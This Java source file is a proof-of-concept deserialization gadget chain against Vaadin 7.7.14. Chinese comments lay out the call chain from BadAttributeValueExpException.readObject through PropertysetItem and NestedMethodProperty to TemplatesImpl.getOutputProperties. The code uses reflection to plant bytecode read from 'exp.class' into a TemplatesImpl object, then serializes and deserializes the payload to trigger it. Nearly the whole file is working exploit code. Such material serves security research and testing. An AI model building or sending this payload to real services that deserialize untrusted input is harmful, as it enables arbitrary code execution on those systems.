import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;

import com.vaadin.data.util.NestedMethodProperty;
import com.vaadin.data.util.PropertysetItem;
import util.Util;

import javax.management.BadAttributeValueExpException;

/*调用链:
* BadAttributeValueExpException.readObject
*   PropertysetItem.toString
*       NestedMethodProperty.getValue
*           TemplatesImpl.getOutputProperties
*
*
* */
/*
*版本依赖:
* vaadin-server : 7.7.14
vaadin-shared : 7.7.14
* */
public class Vaddin1 {
    public static void main(String[] args) throws  Exception{
        TemplatesImpl templates=new TemplatesImpl();
        Class templatesClass=templates.getClass();
        Field namefield=templatesClass.getDeclaredField("_name");
        namefield.setAccessible(true);
        namefield.set(templates,"dragonkeep");
        Field bytecodefield=templatesClass.getDeclaredField("_bytecodes");
        bytecodefield.setAccessible(true);
        byte[] code = Files.readAllBytes(Paths.get("exp.class"));
        byte[][] codes={code};
        bytecodefield.set(templates,codes);
        Field tfactoryField=templatesClass.getDeclaredField("_tfactory");
        tfactoryField.setAccessible(true);
        tfactoryField.set(templates,new TransformerFactoryImpl());

        PropertysetItem pItem = new PropertysetItem();
        NestedMethodProperty<Object> nmprop = new NestedMethodProperty<Object>(templates, "outputProperties");
        pItem.addItemProperty("outputProperties", nmprop);


        BadAttributeValueExpException exception = new BadAttributeValueExpException("dragonkeep");
        Field                         field     = BadAttributeValueExpException.class.getDeclaredField("val");
        field.setAccessible(true);
        field.set(exception, pItem);
        Util.serialize(exception);
        Util.unserialize();

    }
}
